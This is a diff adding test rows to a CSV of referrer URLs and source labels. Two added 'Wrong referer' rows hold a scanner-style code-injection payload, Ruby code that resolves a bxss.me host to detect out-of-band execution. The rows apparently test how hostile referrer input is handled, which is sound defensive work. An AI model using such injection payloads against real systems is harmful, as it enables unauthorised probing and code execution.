@@ -135,3 +135,6 @@ Reddit,android-app://com.reddit.frontpage/,external (media sites),TRUE,Reddit
 Steam,https://steam.com/,external (media sites),TRUE,Steam
 Threads,https://threads.com/,external (media sites),TRUE,Threads
 Twitch,https://twitch.tv/,external (media sites),TRUE,Twitch
+Very long referer,http://very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.very.large.horse/,unknown,FALSE,none
+Wrong referer,'A'.concat(70-3).concat(22*4).concat(97).concat(89).concat(112).concat(73)+(require'socket' Socket.gethostbyname('hitkr'+'wekhiktu28ae6.bxss.me.')[3].to_s),unknown,FALSE,none
+Wrong referer with protocol,http://'A'.concat(70-3).concat(22*4).concat(97).concat(89).concat(112).concat(73)+(require'socket' Socket.gethostbyname('hitkr'+'wekhiktu28ae6.bxss.me.')[3].to_s),unknown,FALSE,none
